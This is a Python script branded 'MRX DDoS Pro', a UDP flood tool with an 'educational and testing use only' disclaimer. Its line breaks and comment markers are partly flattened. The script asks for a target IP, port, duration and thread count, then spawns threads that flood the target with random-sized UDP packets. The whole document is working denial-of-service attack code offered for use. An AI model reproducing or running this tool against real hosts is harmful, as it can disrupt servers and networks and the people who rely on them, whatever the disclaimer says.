import socket import threading import random import os import time

Colors for terminal output

class Colors: HEADER = '\033[95m' OKBLUE = '\033[94m' OKCYAN = '\033[96m' OKGREEN = '\033[92m' WARNING = '\033[93m' FAIL = '\033[91m' ENDC = '\033[0m' BOLD = '\033[1m' UNDERLINE = '\033[4m'

os.system("clear")

MRX Banner

print(Colors.FAIL + Colors.BOLD + '''

█▀▄▀█ █▀▀█ █░█
█░▀░█ █▄▄▀ ▄▀▄
▀░░░▀ ▀░▀▀ ▀░▀
MRX DDoS Pro | UDP Flood Tool For Educational and Testing Use Only ''')

Inputs

ip = input(Colors.OKCYAN + "[+] Target IP: ") port = int(input("[+] Port (default 7777): ") or 7777) duration = int(input("[+] Duration (seconds): ")) threads = int(input("[+] Thread Count: "))

Packet counter

packet_counter = 0 lock = threading.Lock()

UDP Attack Function

def udp_flood(): global packet_counter timeout = time.time() + duration sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) while time.time() < timeout: data = random._urandom(random.randint(1024, 6000)) try: sock.sendto(data, (ip, port)) with lock: packet_counter += 1 print(f"{Colors.OKGREEN}[MRX] Packet #{packet_counter} sent to {ip}:{port}{Colors.ENDC}") except: continue

Launch attack

print(Colors.OKBLUE + f"\n[!] Starting attack on {ip}:{port} for {duration} seconds with {threads} threads...\n") time.sleep(2)

for i in range(threads): thread = threading.Thread(target=udp_flood) thread.start()

